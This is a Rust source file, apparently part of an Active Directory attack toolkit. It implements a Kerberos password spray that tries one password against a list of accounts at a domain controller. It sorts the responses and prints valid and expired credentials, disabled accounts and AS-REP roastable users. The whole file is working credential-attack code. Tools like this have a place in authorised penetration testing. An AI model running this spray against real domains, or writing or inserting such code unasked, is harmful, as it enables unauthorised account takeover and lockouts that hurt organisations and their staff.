//! Kerberos password spray: one password across a user list, classified by the
//! KDC response (valid / expired / disabled / AS-REP roastable / invalid).

use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct SprayArgs {
    /// KDC `host[:port]`
    #[arg(long)]
    pub kdc: String,
    /// Kerberos realm, e.g. CORP.LOCAL
    #[arg(long)]
    pub realm: String,
    /// Users: comma-separated list, or @file with one per line
    #[arg(long)]
    pub users: String,
    /// Single password to spray across all users
    #[arg(long)]
    pub password: String,
}

/// Kerberos password spray: one password across a user list, classified by KDC response.
pub(crate) async fn spray(a: SprayArgs) -> Result<()> {
    use adhammer_kerberos::{check_credential, CredResult};

    let users: Vec<String> = if let Some(path) = a.users.strip_prefix('@') {
        std::fs::read_to_string(path)
            .with_context(|| format!("read users list {path}"))?
            .lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect()
    } else if std::path::Path::new(&a.users).is_file() {
        // Path passed without `@` prefix — a common gotcha. Treat as a file with a hint.
        eprintln!(
            "[!] `--users {}` looks like a file path — use `--users @{}` to read it as a list. Treating the arg as one user name.",
            a.users, a.users
        );
        vec![a.users.clone()]
    } else {
        a.users
            .split(',')
            .map(|u| u.trim().to_string())
            .filter(|u| !u.is_empty())
            .collect()
    };

    if users.is_empty() {
        anyhow::bail!("no users to spray (empty --users)");
    }
    eprintln!(
        "[*] spraying {} user(s) against {} @ {} …",
        users.len(),
        a.realm,
        a.kdc
    );
    let (mut valid, mut asrep, mut disabled, mut other) = (0u32, 0u32, 0u32, 0u32);
    for u in &users {
        match check_credential(u, &a.password, &a.realm, &a.kdc).await {
            Ok(CredResult::Valid) => {
                valid += 1;
                println!("[+] VALID           {u}:{}", a.password);
            }
            Ok(CredResult::ValidButExpired) => {
                valid += 1;
                println!("[+] VALID (expired) {u}:{}", a.password);
            }
            Ok(CredResult::Disabled) => {
                disabled += 1;
                println!("[-] disabled/locked {u}");
            }
            Ok(CredResult::NoPreAuth) => {
                asrep += 1;
                println!("[*] AS-REP roastable {u} (no pre-auth)");
            }
            Ok(CredResult::Invalid) | Ok(CredResult::NoSuchUser) => {} // quiet — the norm
            Ok(CredResult::Other(c)) => {
                other += 1;
                eprintln!("    {u}: KDC error {c}");
            }
            Err(e) => {
                other += 1;
                eprintln!("    {u}: {e}");
            }
        }
    }
    eprintln!(
        "[*] spray done: {}/{} valid, {} AS-REP roastable, {} disabled, {} other error(s)",
        valid,
        users.len(),
        asrep,
        disabled,
        other
    );
    Ok(())
}
